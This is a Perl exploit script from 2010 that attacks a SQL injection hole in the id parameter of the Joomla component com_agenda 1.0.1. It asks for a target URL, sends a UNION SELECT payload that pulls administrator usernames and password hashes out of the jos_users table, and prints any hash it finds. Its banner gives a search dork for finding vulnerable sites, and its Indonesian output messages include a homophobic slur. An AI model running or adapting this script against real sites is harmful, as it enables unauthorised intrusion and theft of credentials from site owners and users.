#!/usr/bin/perl -w

# Joomla Component com_agenda 1.0.1 (id) Remote SQL Injection Vulnerability
# Author	: v3n0m
# Site		: http://yogyacarderlink.web.id/
# Group		: YOGYACARDERLINK
# Date		: April, 10-2010 [INDONESIA]
# Software	: com_agenda
# Version	: 1.0.1 Other versions may also be affected
# Download	: http://www.joomlanetprojects.com/index.php/es/joomla-projects-descargas/joomla-1/joomla-1/42-comagenda.html
# Greetz	: All Yogyacarderlink & devilzc0de Crews
# ShoutZ	: elich4 (smart but absurd)
print "|----------------------------------------------------|\n";
print "|  YOGYACARDERLINK 'com_agenda Remote SQL Injector'  |\n";
print "| Coded by : v3n0m                                   |\n";
print "| Greets   : Yogyacarderlink Crew                    |\n";
print "| Shoutz   : elich4 (smart but absurd)               |\n";
print "| Dork     : inurl:option=com_agenda                 |\n";
print "|                                                    |\n";
print "|                         www.yogyacarderlink.web.id |\n";
print "|----------------------------------------------------|\n";
use LWP::UserAgent;
print "\nMasukin Target:[http://wwww.target.com/path/]: ";
chomp(my $target=<STDIN>);
#Nama Column
$concatenation="concat(username,char(58),password)v3n0m";
#Nama Table
$table="jos_users";
$injection="-999999+union+select+";
$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
$host = $target . "index.php?option=com_agenda&view=detail&id=".$injection."0,".$concatenation."2,3,4,5,6,7,8,9,10,11,12,13,14,15,16+from/**/".$table."+--+";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-fA-F]{32})/){
print "\n[+] Admin Hash : $1\n";
print "[+] Success !! Check target for details...\n";
print "\n";
print "Attention:\n";
print "v3n0m emang paling ganteng se-jabotabek\n";
print "Yang kaga setuju/protes = GAY !!\n";
print "\n";
}
else{print "\n[-] wah gagal bro (Belom Cebok tangan lo)...\n";
}